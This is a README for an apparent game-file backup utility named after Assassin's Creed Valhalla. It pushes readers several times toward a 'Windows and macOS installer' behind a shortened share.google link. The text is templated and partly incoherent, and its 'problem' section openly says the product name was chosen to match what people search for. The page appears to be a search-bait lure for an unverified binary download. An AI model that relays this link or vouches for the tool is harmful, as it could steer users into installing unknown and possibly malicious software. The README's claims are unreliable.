![Assassins Creed Valhalla Desktop](assets/hero.png)

# Assassins Creed Valhalla Desktop

*Archive Assassins Creed Valhalla files on this machine before you change the install.*

## What Assassins Creed Valhalla Desktop is

This repository is **Assassins Creed Valhalla Desktop**, a desktop utility. Archive Assassins Creed Valhalla files on this machine before you change the install.

Assassins Creed Valhalla config and export files hide under AppData and Documents.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Maps Assassins Creed Valhalla data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/eshaw1423/assassins-creed-valhalla-desktop

MIT license. See `LICENSE`.
